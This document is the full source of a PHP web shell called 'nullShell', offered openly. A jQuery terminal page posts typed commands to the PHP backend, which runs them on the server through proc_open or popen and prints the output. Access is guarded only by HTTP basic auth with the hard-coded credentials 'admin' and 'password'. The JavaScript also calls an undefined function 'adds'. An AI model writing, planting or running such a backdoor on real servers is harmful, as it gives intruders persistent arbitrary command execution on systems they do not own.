<?php

define("Username", 'admin');
define("Password", 'password');


if (($_SERVER['PHP_AUTH_USER'] != Username) || ($_SERVER['PHP_AUTH_PW'] != Password)) {
  header('WWW-Authenticate: Basic Realm="Secret Stash"');
  header('HTTP/1.0 401 Unauthorized');
  header('Content-Type: text/txt');
  print('401 Unauthorized');
  exit();
}

if (isset($_POST['cmd'])) {
  if (PHP_OS == 'Linux') {
    $descriptorspec = array(
      0 => array("pipe", "r"),
      1 => array("pipe", "w"),
      2 => array("pipe", "w")
    );
    flush();
    $process = proc_open($_POST['cmd'], $descriptorspec, $pipes, realpath('./'), array());
    if (is_resource($process)) {
      while ($s = fgets($pipes[1])) {
        print htmlentities($s);
        flush();
      }
    }
  } else {
    $a = popen($_POST['cmd'], 'r');
    while ($b = fgets($a, 2048)) {
      echo htmlentities($b);
      ob_flush();
      flush();
    }
    pclose($a);
  }

  exit();
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>nullShell</title>
  <link rel='stylesheet' href='https://unpkg.com/jquery.terminal/css/jquery.terminal.min.css'>
  <style>
    body {
      min-height: 100vh;
      color: #aaa;
      background-color: var(--background, #000);
      padding: 10px;
      box-sizing: border-box;
    }

    pre,
    body {
      margin: 0;
      margin: 0;
    }

    pre,
    .cmd {
      line-height: 14px;
      font-size: 12px;
    }
  </style>

</head>

<body>
  <pre>=========================================================
                       _ _  _____ _          _ _ 
                      | | |/ ____| |        | | |
           _ __  _   _| | | (___ | |__   ___| | |
          | '_ \| | | | | |\___ \| '_ \ / _ \ | |
          | | | | |_| | | |____) | | | |  __/ | |
          |_| |_|\__,_|_|_|_____/|_| |_|\___|_|_|

              Welcome to nullShell! 
          A simple Web Shell written in PHP
      GitHub: https://github.com/michioxd/nullShell
=========================================================
</pre>
  <div id="loader"></div>
  <script src='https://code.jquery.com/jquery-1.7.1.min.js'></script>
  <script src='https://unpkg.com/jquery.terminal/js/jquery.terminal.js'></script>
  <script src='https://unpkg.com/jquery.terminal/js/jquery.mousewheel-min.js'></script>
  <script src='https://unpkg.com/js-polyfills/keyboard.js'></script>
  <script>
    function Add(text, cmd = null) {
      if (cmd == null) {
        $('pre').append(text);
      } else {
        $('pre').append('> ' + cmd + '\n' + text);
      }
    }


    var cmd = $('#loader').cmd({
      prompt: '> ',
      width: '100%',
      commands: function(command) {
        if (command == 'ns.about') {
          adds('nullShell v1.0.0', command);
        } else if (command == 'cls' || command == 'clear') {
          $('pre').empty();
        } else {
          $.ajax({
            url: '',
            type: 'POST',
            cache: false,
            data: {
              cmd: command
            },
            success: function(data) {
              Add(data, command);
            }
          });
        }
      }
    });
    cmd.resize(true);
  </script>

</body>

</html>
